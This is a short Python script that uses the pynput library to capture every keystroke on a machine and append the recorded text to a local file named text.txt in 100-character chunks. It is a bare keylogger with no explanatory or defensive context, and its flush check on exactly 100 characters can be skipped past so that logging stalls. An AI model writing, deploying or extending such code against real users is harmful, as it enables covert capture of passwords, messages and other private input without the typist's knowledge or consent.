#!/usr/bin/env python
import pynput.keyboard
log = ""


def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log+" "
        else:
            log = log + " "+str(key)+" "
    if len(log) == 100:
        with open("text.txt", "a") as file_key:
            file_key.write(log)
            log = ""


keyboard = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard:
    keyboard.join()